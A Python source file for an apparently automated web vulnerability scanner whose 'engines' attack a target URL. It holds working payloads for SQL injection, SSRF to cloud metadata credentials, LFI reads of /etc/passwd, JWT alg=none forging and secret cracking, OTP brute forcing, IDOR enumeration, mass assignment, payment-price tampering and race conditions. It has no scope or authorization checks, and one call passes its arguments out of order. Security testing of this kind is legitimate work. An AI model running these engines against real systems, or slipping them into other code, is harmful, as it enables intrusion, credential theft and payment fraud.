"""
engines.py — All attack engines
BUG FIXES:
- Added all missing engines (e14_bac, e13_priv_esc, e17_payment, e32_lfi, e25_graphql, e26_ws, e11_session)
- Fixed sync requests called from async context
- Fixed registry completeness
"""
import asyncio
import base64
import hashlib
import hmac
import json
import random
import re
import time
from typing import Dict, List, Optional
from urllib.parse import urlparse, urljoin

try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False

try:
    import requests as req_lib
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


class EngineResult:
    def __init__(self):
        self.success = False
        self.findings = []
        self.info = {}
        self.error = None

    def add_finding(self, vuln_type, severity, endpoint, description,
                    param=None, method="GET", proof_req=None, proof_resp=None,
                    confidence=70, remediation=None):
        self.findings.append({
            "vuln_type": vuln_type, "severity": severity, "endpoint": endpoint,
            "description": description, "param": param, "method": method,
            "proof_req": proof_req,
            "proof_resp": (proof_resp[:400] if proof_resp else None),
            "confidence": confidence, "remediation": remediation
        })
        self.success = True

    def to_dict(self):
        return {"success": self.success, "findings": self.findings,
                "info": self.info, "error": self.error}


class BaseEngine:
    def __init__(self, http_client, db, rules, logger=None):
        self.http = http_client
        self.db = db
        self.rules = rules
        self.log = logger

    def _log(self, msg, level="debug"):
        """Only log at debug level to avoid noise"""
        if self.log:
            if level == "info":
                self.log.info(msg)
            elif level == "warn":
                self.log.warn(msg)
            elif level == "finding":
                pass
            else:
                self.log.debug(msg)

    async def run(self, params):
        raise NotImplementedError


# ── E01 RECON ────────────────────────────────────────────
class ReconEngine(BaseEngine):
    async def run(self, params):
        result = EngineResult()
        url = params.get("url", "")
        self._log(f"Recon: {url}", "info")
        try:
            resp = await self.http.request("GET", url, timeout=10)
            if not resp or resp.get("status", 0) == 0:
                result.error = "unreachable"
                return result

            tech = self._detect_tech(resp)
            result.info["tech_stack"] = tech
            result.info["status"] = resp.get("status")
            result.info["server"] = resp.get("headers", {}).get("server", "")
            result.info["waf"] = self.http.waf_detected

            missing = self._check_sec_headers(resp.get("headers", {}))
            for issue in missing:
                result.add_finding("MISSING_SECURITY_HEADER", "LOW", url,
                                   issue, confidence=90,
                                   remediation=f"Add: {issue}")
            result.success = True
        except Exception as e:
            result.error = str(e)
        return result

    def _detect_tech(self, resp):
        tech = []
        combined = (str(resp.get("headers",{})) + resp.get("body","")[:3000]).lower()
        checks = {
            "WordPress": ["wp-content","wp-includes"],
            "Laravel": ["laravel_session"],
            "Django": ["csrftoken","django"],
            "Rails": ["_rails_session"],
            "Express": ["x-powered-by: express"],
            "PHP": ["x-powered-by: php",".php"],
            "ASP.NET": ["asp.net","__viewstate"],
            "Spring": ["jsessionid"],
            "Next.js": ["x-nextjs","__next"],
            "React": ["react"],
            "GraphQL": ["/graphql","graphiql"],
        }
        for name, pats in checks.items():
            if any(p in combined for p in pats):
                tech.append(name)
        return tech

    def _check_sec_headers(self, headers):
        needed = ["x-frame-options","x-content-type-options",
                  "content-security-policy","strict-transport-security"]
        h_lower = {k.lower() for k in headers}
        return [h for h in needed if h not in h_lower]


# ── E02 ENDPOINT DISCOVERY ───────────────────────────────
class EndpointDiscoveryEngine(BaseEngine):
    PATHS = [
        "/api","/api/v1","/api/v2","/graphql","/graphiql",
        "/admin","/admin/login","/login","/logout","/register","/signup",
        "/profile","/account","/settings","/dashboard",
        "/users","/user","/api/users","/api/user",
        "/api/auth","/auth","/oauth","/token",
        "/api/admin","/api/orders","/api/payment","/api/products",
        "/api/files","/api/upload","/swagger","/swagger-ui","/api-docs",
        "/openapi.json","/robots.txt","/sitemap.xml","/.env","/config.json",
        "/api/me","/api/profile","/api/account","/api/search",
        "/api/reset-password","/forgot-password","/api/2fa","/verify",
        "/api/notifications","/api/messages","/api/reports",
        "/api/export","/api/import","/ws","/websocket",
    ]
    TYPE_MAP = {
        "auth": ["login","logout","auth","token","oauth","register","signup","2fa","otp","verify"],
        "payment": ["payment","pay","checkout","order","invoice","billing","subscription","purchase"],
        "admin": ["admin","administrator"],
        "file": ["upload","file","download","export","import"],
        "graphql": ["graphql","gql","graphiql"],
        "websocket": ["ws","websocket","socket"],
        "profile": ["profile","account","user","me"],
        "api": ["api"],
    }
    PRIORITY = {"auth":10,"payment":10,"admin":9,"file":7,
                "graphql":8,"websocket":6,"profile":7,"api":6,"normal":3}

    async def run(self, params):
        result = EngineResult()
        base = params.get("url","").rstrip("/")
        self._log(f"Discovering on {base}", "info")
        found = 0
        for path in self.PATHS:
            url = base + path
            try:
                resp = await self.http.request("GET", url, timeout=5)
                if resp and resp.get("status",404) not in [404, 0, 400]:
                    ntype = self._classify(path)
                    prio = self.PRIORITY.get(ntype, 3)
                    sensitive = ntype in ["auth","payment","admin","file"]
                    self.db.add_node(url, node_type=ntype.upper(),
                                     priority=prio, sensitive=sensitive)
                    found += 1
                    self._log(f"  [{resp['status']}] {url} [{ntype.upper()}]")
            except Exception:
                pass
            await asyncio.sleep(0.05)
        result.info["endpoints_found"] = found
        result.success = True
        return result

    def _classify(self, path):
        p = path.lower()
        for t, keywords in self.TYPE_MAP.items():
            if any(k in p for k in keywords):
                return t
        return "normal"


# ── E08 AUTH BYPASS ──────────────────────────────────────
class AuthBypassEngine(BaseEngine):
    async def run(self, params):
        result = EngineResult()
        endpoint = params.get("endpoint","")
        self._log(f"Auth bypass: {endpoint}")

        # No-auth access
        resp = await self.http.request("GET", endpoint, timeout=8)
        if resp and resp.get("status") == 200:
            body = resp.get("body","")
            if len(body) > 50 and not any(x in body.lower() for x in
                    ["login","sign in","unauthorized","forbidden","redirect"]):
                result.add_finding(
                    "AUTH_BYPASS","CRITICAL", endpoint, "GET",
                    "Endpoint accessible without authentication",
                    proof_req=f"GET {endpoint} (no token)",
                    proof_resp=body[:200], confidence=85,
                    remediation="Add authentication middleware."
                )

        # Method override bypass
        for m in ["POST","PUT","HEAD","OPTIONS","TRACE"]:
            resp = await self.http.request(m, endpoint, timeout=4)
            if resp and resp.get("status") == 200:
                result.add_finding(
                    "HTTP_METHOD_BYPASS","HIGH", endpoint,
                    f"Auth bypass via HTTP method: {m}",
                    method=m, confidence=70,
                    remediation="Apply auth check to ALL HTTP methods."
                )
                break
            await asyncio.sleep(0.1)

        # Path case variation
        parsed = urlparse(endpoint)
        upper_url = endpoint.replace(parsed.path, parsed.path.upper())
        if upper_url != endpoint:
            resp = await self.http.request("GET", upper_url, timeout=4)
            if resp and resp.get("status") == 200:
                result.add_finding(
                    "BAC_CASE_BYPASS","HIGH", upper_url,
                    "Auth bypass via uppercase path",
                    confidence=65,
                    remediation="Normalize paths before auth check."
                )

        result.success = True
        return result


# ── E09 JWT ENGINE ───────────────────────────────────────
class JWTEngine(BaseEngine):
    def _b64url(self, data):
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
    def _b64url_dec(self, s):
        return base64.urlsafe_b64decode(s + "=" * (4 - len(s) % 4))

    async def run(self, params):
        result = EngineResult()
        token = params.get("token","")
        endpoint = params.get("endpoint","")
        if not token or not token.startswith("eyJ"):
            result.info["skipped"] = "no JWT"
            return result

        try:
            parts = token.split(".")
            if len(parts) != 3:
                return result
            header  = json.loads(self._b64url_dec(parts[0]))
            payload = json.loads(self._b64url_dec(parts[1]))

            # Test 1: alg=none
            h2 = {**header, "alg": "none"}
            none_tok = (self._b64url(json.dumps(h2).encode()) + "." +
                        self._b64url(json.dumps(payload).encode()) + ".")
            r = await self.http.request("GET", endpoint,
                    headers={"Authorization": f"Bearer {none_tok}"}, timeout=6)
            if r and r.get("status") == 200:
                result.add_finding("JWT_NONE_ALGORITHM","CRITICAL", endpoint,
                    "JWT accepts 'none' algorithm — signature bypassed",
                    confidence=95, remediation="Reject 'none' algorithm explicitly.")

            # Test 2: role claim tamper
            for field in ["role","admin","is_admin","user_type"]:
                if field in payload:
                    p2 = {**payload, field: "admin" if field != "is_admin" else True}
                    h_enc = self._b64url(json.dumps(header).encode())
                    p_enc = self._b64url(json.dumps(p2).encode())
                    tampered = f"{h_enc}.{p_enc}.{parts[2]}"
                    r2 = await self.http.request("GET", endpoint,
                            headers={"Authorization": f"Bearer {tampered}"}, timeout=6)
                    if r2 and r2.get("status") == 200:
                        result.add_finding("JWT_ROLE_TAMPER","CRITICAL", endpoint,
                            f"JWT role claim modifiable (field: {field})",
                            confidence=88, remediation="Always verify signature before trusting claims.")
                    break

            # Test 3: weak secret brute force (offline)
            alg = header.get("alg","").upper()
            if alg in ["HS256","HS384","HS512"]:
                secret = self._brute_secret(parts, alg)
                if secret:
                    result.add_finding("JWT_WEAK_SECRET","CRITICAL", endpoint,
                        f"JWT secret cracked: '{secret}'",
                        confidence=99, remediation="Use cryptographically random 256-bit secret.")

        except Exception as e:
            result.error = str(e)

        result.success = True
        return result

    def _brute_secret(self, parts, alg):
        common = ["secret","password","123456","admin","key","test",
                  "your-256-bit-secret","supersecret","jwt_secret","changeme",
                  "default","qwerty","1234567890","jwt","mysecret"]
        msg = f"{parts[0]}.{parts[1]}".encode()
        hmap = {"HS256": hashlib.sha256,"HS384": hashlib.sha384,"HS512": hashlib.sha512}
        hf = hmap.get(alg, hashlib.sha256)
        try:
            expected = self._b64url_dec(parts[2])
        except:
            return None
        for s in common:
            if hmac.new(s.encode(), msg, hf).digest() == expected:
                return s
        return None


# ── E10 OTP ENGINE ───────────────────────────────────────
class OTPEngine(BaseEngine):
    async def run(self, params):
        result = EngineResult()
        endpoint = params.get("endpoint","")
        otp_param = params.get("otp_param","otp")
        token = params.get("session_token")

        blocked = None
        for i, otp in enumerate(["000000","111111","222222","333333","444444"]):
            r = await self.http.request("POST", endpoint,
                    json_body={otp_param: otp}, session_token=token, timeout=6)
            if r and r.get("status") == 429:
                blocked = i+1
                break
            await asyncio.sleep(0.3)

        if not blocked:
            result.add_finding("OTP_NO_RATE_LIMIT","CRITICAL", endpoint,
                "OTP brute-forceable — no rate limiting detected",
                confidence=80,
                remediation="Limit to 5 attempts per 15 minutes. Lock after failures.")

        result.success = True
        return result


# ── E11 SESSION ENGINE ───────────────────────────────────
class SessionEngine(BaseEngine):
    async def run(self, params):
        result = EngineResult()
        endpoint = params.get("endpoint","")
        token = params.get("session_token")
        if not token:
            result.info["skipped"] = "no session token"
            return result

        # Test: token still valid after logout
        logout_urls = [endpoint.split("/api")[0] + p
                       for p in ["/api/logout","/logout","/auth/logout"]]
        for lurl in logout_urls:
            r = await self.http.request("POST", lurl,
                    headers={"Authorization": f"Bearer {token}"}, timeout=5)
            if r and r.get("status") in [200,204]:
                # Now retry original with same token
                r2 = await self.http.request("GET", endpoint,
                        headers={"Authorization": f"Bearer {token}"}, timeout=5)
                if r2 and r2.get("status") == 200:
                    result.add_finding("SESSION_AFTER_LOGOUT","HIGH", endpoint,
                        "Token remains valid after logout",
                        confidence=85,
                        remediation="Invalidate tokens server-side on logout. Maintain token blocklist.")
                break

        result.success = True
        return result


# ── E12 IDOR ENGINE ──────────────────────────────────────
class IDOREngine(BaseEngine):
    ID_PARAMS = ["id","user_id","order_id","account_id","uid","pid",
                 "doc_id","file_id","invoice_id","ticket_id","profile_id",
                 "item_id","record_id","customer_id","transaction_id"]

    async def run(self, params):
        result = EngineResult()
        endpoint = params.get("endpoint","")
        methods  = params.get("methods",["GET"])
        token_a  = params.get("session_a") or params.get("session_token")

        # Baseline
        base_resp = await self.http.request("GET", endpoint,
                        session_token=token_a, timeout=8)
        if not base_resp or base_resp.get("status",0) not in [200,201]:
            result.info["skipped"] = "baseline failed"
            return result

        base_body = base_resp.get("body","")
        base_size = len(base_body)
        self.db.save_baseline(endpoint, base_resp.get("status",200),
                              base_size, base_resp.get("response_time",0),
                              self.http.body_hash(base_body))

        own_ids = self._extract_ids(base_body)
        test_ids = self._gen_test_ids(own_ids)

        for tid in test_ids[:15]:
            mod_url = self._inject_id(endpoint, tid)
            if not mod_url:
                continue
            for method in methods[:2]:
                r = await self.http.request(method, mod_url,
                        session_token=token_a, timeout=6)
                if r and self._is_idor(r, base_size, tid, own_ids):
                    result.add_finding(
                        "IDOR","HIGH", endpoint,
                        f"IDOR: ID {tid} returns different user data",
                        param="id", method=method,
                        proof_req=f"{method} {mod_url}",
                        proof_resp=r.get("body","")[:250],
                        confidence=80,
                        remediation="Verify resource ownership before returning data."
                    )
                await asyncio.sleep(0.15)

        result.success = True
        return result

    def _extract_ids(self, body):
        ids = []
        try:
            d = json.loads(body)
            ids = self._r_extract(d)
        except:
            ids = re.findall(r'"(?:id|user_id)":\s*(\d+)', body)
        return list(set(str(i) for i in ids))[:5]

    def _r_extract(self, obj, depth=0):
        if depth > 4: return []
        ids = []
        if isinstance(obj, dict):
            for k,v in obj.items():
                if k in self.ID_PARAMS and isinstance(v,(int,str)):
                    ids.append(str(v))
                ids += self._r_extract(v, depth+1)
        elif isinstance(obj, list):
            for i in obj[:3]:
                ids += self._r_extract(i, depth+1)
        return ids

    def _gen_test_ids(self, own_ids):
        ids = []
        for oid in own_ids:
            try:
                n = int(oid)
                for off in range(1,5):
                    ids += [str(n+off)]
                    if n-off > 0: ids.append(str(n-off))
                ids += ["1","2","3"]
            except:
                ids += ["1","2","3","admin"]
        return list(set(ids)) if ids else ["1","2","3","4","5"]

    def _inject_id(self, url, new_id):
        m = re.search(r'/(\d+)(?:/|$|\?)', url)
        if m:
            return url.replace(f"/{m.group(1)}", f"/{new_id}", 1)
        for p in self.ID_PARAMS:
            if f"{p}=" in url:
                return re.sub(f"{p}=\\d+", f"{p}={new_id}", url)
        return None

    def _is_idor(self, resp, base_size, tid, own_ids):
        if resp.get("status",0) not in [200,201]:
            return False
        size = len(resp.get("body",""))
        if abs(size - base_size) > 150:
            return True
        body = resp.get("body","")
        if tid not in (own_ids or []) and tid in body:
            return True
        return False


# ── E13 PRIVILEGE ESCALATION ─────────────────────────────
class PrivEscEngine(BaseEngine):
    async def run(self, params):
        result = EngineResult()
        endpoint = params.get("endpoint","")
        user_token = params.get("session_token")

        # Access admin endpoint with user token
        r = await self.http.request("GET", endpoint, session_token=user_token, timeout=7)
        if r and r.get("status") == 200:
            body = r.get("body","")
            # Check if response has admin-like data
            admin_indicators = ["users_list","admin","all_users","total_users",
                                "manage","dashboard","statistics","revenue"]
            if any(i in body.lower() for i in admin_indicators):
                result.add_finding(
                    "PRIVILEGE_ESCALATION","CRITICAL", endpoint,
                    "Admin/privileged endpoint accessible with low-priv token",
                    proof_req=f"GET {endpoint} (user token)",
                    proof_resp=body[:250], confidence=80,
                    remediation="Implement role-based access control. Check user role server-side."
                )

        # No-token access
        r2 = await self.http.request("GET", endpoint, timeout=5)
        if r2 and r2.get("status") == 200:
            result.add_finding(
                "BROKEN_ACCESS_CONTROL","CRITICAL", endpoint,
                "Privileged endpoint accessible without any token",
                confidence=90,
                remediation="Add authentication + authorization to this endpoint."
            )

        result.success = True
        return result


# ── E14 BAC ENGINE ───────────────────────────────────────
class BACEngine(BaseEngine):
    async def run(self, params):
        result = EngineResult()
        endpoint = params.get("endpoint","")

        # Direct access without auth
        r = await self.http.request("GET", endpoint, timeout=7)
        if r and r.get("status") == 200:
            body = r.get("body","")
            if len(body) > 100 and not any(x in body.lower()
                    for x in ["login","signin","unauthorized","redirect"]):
                result.add_finding(
                    "BAC_UNAUTHENTICATED","HIGH", endpoint,
                    "Endpoint accessible without authentication",
                    confidence=75,
                    remediation="Require authentication for all sensitive endpoints."
                )

        # Path traversal bypass
        parsed = urlparse(endpoint)
        path = parsed.path
        variants = [
            endpoint.replace(path, path.upper()),
            endpoint.replace(path, path + "/"),
            endpoint.replace(path, path + "?"),
            endpoint + ".json",
        ]
        for v in variants:
            if v == endpoint:
                continue
            r = await self.http.request("GET", v, timeout=4)
            if r and r.get("status") == 200:
                result.add_finding(
                    "BAC_PATH_BYPASS","MEDIUM", v,
                    f"Access control bypass via path variation",
                    confidence=65,
                    remediation="Normalize and validate paths before access control check."
                )
                break
            await asyncio.sleep(0.1)

        result.success = True
        return result


# ── E15 MASS ASSIGNMENT ──────────────────────────────────
class MassAssignmentEngine(BaseEngine):
    FIELDS = ["role","is_admin","admin","verified","active","balance","credit",
              "permissions","level","status","privileged","is_superuser",
              "staff","superadmin","accountType","userType","plan","trusted"]

    async def run(self, params):
        result = EngineResult()
        endpoint = params.get("endpoint","")
        method   = params.get("method","PUT")
        token    = params.get("session_token")
        base     = params.get("base_body",{})

        for field in self.FIELDS[:10]:
            for val in ["admin", True, 1]:
                body = {**base, field: val}
                r = await self.http.request(method, endpoint,
                        json_body=body, session_token=token, timeout=5)
                if r and r.get("status") in [200,201]:
                    resp_body = r.get("body","")
                    if str(val).lower() in resp_body.lower() and field in resp_body.lower():
                        result.add_finding(
                            "MASS_ASSIGNMENT","CRITICAL", endpoint,
                            f"Mass assignment: field '{field}={val}' accepted",
                            param=field, method=method,
                            proof_req=f"{method} {endpoint} body={{'{field}':{val}}}",
                            proof_resp=resp_body[:250], confidence=83,
                            remediation="Use allowlist-based parameter filtering. Never use blacklist."
                        )
                await asyncio.sleep(0.1)

        result.success = True
        return result


# ── E16 BUSINESS LOGIC ───────────────────────────────────
class BusinessLogicEngine(BaseEngine):
    async def run(self, params):
        result = EngineResult()
        endpoint = params.get("endpoint","")
        etype    = params.get("endpoint_type","NORMAL")
        token    = params.get("session_token")

        if etype == "PAYMENT":
            for tc in [{"price":0},{"price":-1},{"amount":0},{"total":-100}]:
                r = await self.http.request("POST", endpoint,
                        json_body=tc, session_token=token, timeout=5)
                if r and r.get("status") in [200,201]:
                    body = r.get("body","").lower()
                    if any(x in body for x in ["success","order","transaction","confirmed"]):
                        result.add_finding(
                            "PAYMENT_MANIPULATION","CRITICAL", endpoint,
                            f"Payment accepted with invalid value: {tc}",
                            proof_req=f"POST {endpoint} {tc}",
                            proof_resp=r.get("body","")[:200], confidence=88,
                            remediation="Always validate price/amount server-side. Never trust client values."
                        )
                await asyncio.sleep(0.2)

        # Quantity manipulation
        for qty in [-1, 0, 999999]:
            r = await self.http.request("POST", endpoint,
                    json_body={"quantity": qty}, session_token=token, timeout=5)
            if r and r.get("status") in [200,201]:
                result.add_finding(
                    "QUANTITY_MANIPULATION","HIGH", endpoint,
                    f"Invalid quantity {qty} accepted",
                    confidence=68,
                    remediation="Validate quantity ranges server-side."
                )
            await asyncio.sleep(0.15)

        result.success = True
        return result


# ── E17 PAYMENT ENGINE ───────────────────────────────────
class PaymentEngine(BaseEngine):
    async def run(self, params):
        result = EngineResult()
        endpoint = params.get("endpoint","")
        token    = params.get("session_token")

        attacks = [
            {"price": 0,     "desc": "zero price"},
            {"price": -1,    "desc": "negative price"},
            {"price": 0.001, "desc": "minimal price"},
            {"amount": 0,    "desc": "zero amount"},
            {"total": -100,  "desc": "negative total"},
            {"discount": 100,"desc": "100% discount"},
        ]

        for attack in attacks:
            desc = attack.pop("desc")
            r = await self.http.request("POST", endpoint,
                    json_body=attack, session_token=token, timeout=6)
            if r and r.get("status") in [200,201]:
                body = r.get("body","").lower()
                if any(x in body for x in ["success","paid","order","transaction"]):
                    result.add_finding(
                        "PAYMENT_BYPASS","CRITICAL", endpoint,
                        f"Payment bypassed via {desc}: {attack}",
                        proof_req=f"POST {endpoint} {attack}",
                        proof_resp=r.get("body","")[:250], confidence=90,
                        remediation="Validate all payment amounts server-side. Use signed cart/price on backend."
                    )
            await asyncio.sleep(0.2)

        result.success = True
        return result


# ── E19 RACE CONDITION ───────────────────────────────────
class RaceConditionEngine(BaseEngine):
    async def run(self, params):
        result = EngineResult()
        endpoint   = params.get("endpoint","")
        method     = params.get("method","POST")
        body       = params.get("body",{})
        token      = params.get("session_token")
        concurrent = params.get("concurrent", 15)

        tasks = [
            self.http.request(method, endpoint, json_body=body,
                              session_token=token, timeout=10)
            for _ in range(concurrent)
        ]
        responses = await asyncio.gather(*tasks, return_exceptions=True)

        successes = sum(1 for r in responses
                       if isinstance(r, dict) and r.get("status") in [200,201])

        if successes > 1:
            result.add_finding(
                "RACE_CONDITION","HIGH", endpoint,
                f"Race condition: {successes}/{concurrent} concurrent requests succeeded",
                method=method,
                proof_req=f"{method} {endpoint} x{concurrent} concurrent",
                proof_resp=f"Success count: {successes}/{concurrent}",
                confidence=82,
                remediation="Use atomic DB operations. Implement idempotency keys. Add DB-level locks."
            )

        result.info = {"success_count": successes, "total": concurrent}
        result.success = True
        return result


# ── E20 SQL INJECTION ────────────────────────────────────
class SQLInjectionEngine(BaseEngine):
    ERRORS = ["you have an error in your sql syntax","warning: mysql",
              "unclosed quotation mark","quoted string not properly terminated",
              "pg_query","ora-01756","sqlite3.operationalerror",
              "invalid input syntax","[microsoft][odbc","supplied argument is not"]

    async def run(self, params):
        result = EngineResult()
        endpoint = params.get("endpoint","")
        param    = params.get("param","id")
        method   = params.get("method","GET")
        token    = params.get("session_token")

        base = await self.http.request(method, endpoint, session_token=token, timeout=6)
        if not base:
            return result
        base_size = len(base.get("body",""))

        # Error-based
        for payload in ["'","''","1'","1 AND 1=1"]:
            r = await self._inject(endpoint, param, method, payload, token)
            if r:
                bl = r.get("body","").lower()
                for err in self.ERRORS:
                    if err in bl:
                        result.add_finding(
                            "SQL_INJECTION_ERROR","CRITICAL", endpoint,
                            f"SQL error injection via '{param}' with payload: {payload}",
                            param=param, method=method,
                            proof_req=f"Payload: {payload}",
                            proof_resp=r.get("body","")[:300], confidence=95,
                            remediation="Use parameterized queries / prepared statements."
                        )
                        result.success = True
                        return result
            await asyncio.sleep(0.2)

        # Boolean-based
        r_true  = await self._inject(endpoint, param, method, "1' AND 1=1--", token)
        r_false = await self._inject(endpoint, param, method, "1' AND 1=2--", token)
        if r_true and r_false:
            st = len(r_true.get("body",""))
            sf = len(r_false.get("body",""))
            if abs(st - sf) > 80 and abs(st - base_size) < 60:
                result.add_finding(
                    "SQL_INJECTION_BOOLEAN","CRITICAL", endpoint,
                    f"Boolean-based SQLi in param '{param}'",
                    param=param, confidence=78,
                    remediation="Use parameterized queries."
                )

        # Time-based
        t0 = time.time()
        await self._inject(endpoint, param, method, "1'; WAITFOR DELAY '0:0:3'--", token, timeout=9)
        if time.time() - t0 > 2.5:
            result.add_finding(
                "SQL_INJECTION_TIME","CRITICAL", endpoint,
                f"Time-based SQLi: {time.time()-t0:.1f}s delay",
                param=param, confidence=84,
                remediation="Use parameterized queries immediately."
            )

        result.success = True
        return result

    async def _inject(self, url, param, method, payload, token, timeout=7):
        if method.upper() == "GET":
            sep = "&" if "?" in url else "?"
            return await self.http.request("GET", f"{url}{sep}{param}={payload}",
                                           session_token=token, timeout=timeout)
        return await self.http.request(method, url, json_body={param: payload},
                                       session_token=token, timeout=timeout)


# ── E22 SSRF ENGINE ──────────────────────────────────────
class SSRFEngine(BaseEngine):
    SSRF_PARAMS = ["url","uri","path","dest","destination","redirect","callback",
                   "return","return_url","next","data","ref","feed","host","to",
                   "from","load_url","open","img","src","fetch","proxy","link"]
    PAYLOADS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://127.0.0.1:80",
        "http://localhost:80",
        "file:///etc/passwd",
    ]

    async def run(self, params):
        result = EngineResult()
        endpoint   = params.get("endpoint","")
        url_params = params.get("params",[])
        token      = params.get("session_token")

        candidates = [p for p in url_params if p.lower() in self.SSRF_PARAMS]
        if not candidates and url_params:
            candidates = url_params[:2]
        if not candidates:
            candidates = ["url","redirect","next"]

        for sp in candidates:
            for payload in self.PAYLOADS[:3]:
                r = await self.http.request("GET", endpoint,
                        params={sp: payload}, session_token=token, timeout=7)
                if r and self._is_ssrf(r, payload):
                    result.add_finding(
                        "SSRF","CRITICAL" if "169.254" in payload else "HIGH",
                        endpoint,
                        f"SSRF via param '{sp}' reaching {payload}",
                        param=sp,
                        proof_req=f"?{sp}={payload}",
                        proof_resp=r.get("body","")[:250], confidence=85,
                        remediation="Whitelist allowed URLs. Block internal IP ranges."
                    )
                await asyncio.sleep(0.2)

        result.success = True
        return result

    def _is_ssrf(self, resp, payload):
        if resp.get("status",0) != 200:
            return False
        body = resp.get("body","").lower()
        if "169.254.169.254" in payload:
            return any(i in body for i in ["ami-id","instance-id","iam","security-credentials"])
        if "etc/passwd" in payload:
            return "root:" in body
        if "127.0.0.1" in payload or "localhost" in payload:
            return any(i in body for i in ["server","apache","nginx","ok","redis","pong"])
        return False


# ── E25 GRAPHQL ENGINE ───────────────────────────────────
class GraphQLEngine(BaseEngine):
    async def run(self, params):
        result = EngineResult()
        endpoint = params.get("endpoint","")
        token    = params.get("session_token")

        # Introspection
        introspection = {
            "query": "{ __schema { types { name fields { name } } } }"
        }
        r = await self.http.request("POST", endpoint,
                json_body=introspection, session_token=token, timeout=8)
        if r and r.get("status") == 200:
            body = r.get("body","")
            try:
                data = json.loads(body)
                if "data" in data and "__schema" in str(data):
                    result.add_finding(
                        "GRAPHQL_INTROSPECTION","MEDIUM", endpoint,
                        "GraphQL introspection enabled — schema exposed",
                        proof_req="POST /graphql {__schema{types{name}}}",
                        proof_resp=body[:300], confidence=90,
                        remediation="Disable introspection in production."
                    )
            except:
                pass

        # Batch query abuse
        batch = [{"query":"{ __typename }"} for _ in range(50)]
        r2 = await self.http.request("POST", endpoint,
                json_body=batch, session_token=token, timeout=8)
        if r2 and r2.get("status") == 200:
            result.add_finding(
                "GRAPHQL_BATCHING","MEDIUM", endpoint,
                "GraphQL allows batch queries — rate limit bypass possible",
                confidence=75,
                remediation="Limit batch query count. Implement query cost analysis."
            )

        result.success = True
        return result


# ── E26 WEBSOCKET ENGINE ─────────────────────────────────
class WebSocketEngine(BaseEngine):
    async def run(self, params):
        result = EngineResult()
        endpoint = params.get("endpoint","")

        # Convert http to ws URL
        ws_url = endpoint.replace("https://","wss://").replace("http://","ws://")

        try:
            import websockets
            async with websockets.connect(ws_url, ping_timeout=5) as ws:
                # Test unauthenticated message
                await ws.send(json.dumps({"type":"ping"}))
                resp = await asyncio.wait_for(ws.recv(), timeout=3)
                result.add_finding(
                    "WEBSOCKET_NO_AUTH","HIGH", endpoint,
                    "WebSocket accepts connections without authentication",
                    proof_req=f"WS {ws_url}",
                    proof_resp=str(resp)[:200], confidence=75,
                    remediation="Require auth token on WebSocket connection."
                )
        except ImportError:
            result.info["skipped"] = "websockets library not installed"
        except Exception as e:
            result.info["ws_error"] = str(e)

        result.success = True
        return result


# ── E28 CORS ENGINE ──────────────────────────────────────
class CORSEngine(BaseEngine):
    ORIGINS = ["https://evil.com","null","https://evil.{TARGET}",
               "https://{TARGET}.evil.com","http://evil.com"]

    async def run(self, params):
        result = EngineResult()
        endpoint = params.get("endpoint","")
        domain = urlparse(endpoint).netloc

        for orig_tpl in self.ORIGINS:
            origin = orig_tpl.replace("{TARGET}", domain)
            r = await self.http.request("GET", endpoint,
                    headers={"Origin": origin}, timeout=6)
            if not r:
                continue
            hdrs = {k.lower(): v for k,v in r.get("headers",{}).items()}
            acao = hdrs.get("access-control-allow-origin","")
            acac = hdrs.get("access-control-allow-credentials","").lower()
            if acao == origin or acao == "*":
                sev = "CRITICAL" if acac == "true" else "HIGH"
                result.add_finding(
                    "CORS_MISCONFIGURATION", sev, endpoint,
                    f"CORS reflects '{origin}'. Credentials: {acac}.",
                    proof_req=f"Origin: {origin}",
                    proof_resp=f"ACAO: {acao}\nACAC: {acac}",
                    confidence=88 if acac=="true" else 74,
                    remediation="Whitelist specific origins. Remove wildcard ACAO with credentials."
                )
            await asyncio.sleep(0.15)

        result.success = True
        return result


# ── E32 LFI ENGINE ───────────────────────────────────────
class LFIEngine(BaseEngine):
    PAYLOADS = ["../../etc/passwd","../../../etc/passwd","....//....//etc/passwd",
                "..%2F..%2Fetc%2Fpasswd","../../etc/passwd%00",
                "/etc/passwd","../../../../etc/passwd"]
    PARAMS = ["file","page","path","include","template","load","read","open","lang","locale"]

    async def run(self, params):
        result = EngineResult()
        endpoint   = params.get("endpoint","")
        url_params = params.get("params",[])
        token      = params.get("session_token")

        candidates = [p for p in url_params if p.lower() in self.PARAMS]
        if not candidates:
            candidates = self.PARAMS[:3]

        for param in candidates[:3]:
            for payload in self.PAYLOADS[:4]:
                r = await self.http.request("GET", endpoint,
                        params={param: payload}, session_token=token, timeout=6)
                if r and r.get("status") == 200:
                    body = r.get("body","")
                    if "root:" in body and "/bin/" in body:
                        result.add_finding(
                            "LFI","CRITICAL", endpoint,
                            f"LFI via param '{param}': /etc/passwd readable",
                            param=param,
                            proof_req=f"?{param}={payload}",
                            proof_resp=body[:200], confidence=95,
                            remediation="Never use user input in file paths. Use allowlist of permitted files."
                        )
                await asyncio.sleep(0.15)

        result.success = True
        return result


# ── REGISTRY ─────────────────────────────────────────────
ENGINE_REGISTRY = {
    "e01_recon":           ReconEngine,
    "e02_discovery":       EndpointDiscoveryEngine,
    "e08_auth_bypass":     AuthBypassEngine,
    "e09_jwt_engine":      JWTEngine,
    "e10_otp_engine":      OTPEngine,
    "e11_session_engine":  SessionEngine,
    "e12_idor_engine":     IDOREngine,
    "e13_priv_esc_engine": PrivEscEngine,
    "e14_bac_engine":      BACEngine,
    "e15_mass_assignment": MassAssignmentEngine,
    "e16_business_logic":  BusinessLogicEngine,
    "e17_payment_engine":  PaymentEngine,
    "e19_race_condition":  RaceConditionEngine,
    "e20_injection_engine":SQLInjectionEngine,
    "e22_ssrf_engine":     SSRFEngine,
    "e25_graphql_engine":  GraphQLEngine,
    "e26_websocket_engine":WebSocketEngine,
    "e28_cors_engine":     CORSEngine,
    "e32_lfi_engine":      LFIEngine,
}


def get_engine(name, http_client, db, rules, logger=None):
    cls = ENGINE_REGISTRY.get(name)
    return cls(http_client, db, rules, logger) if cls else None


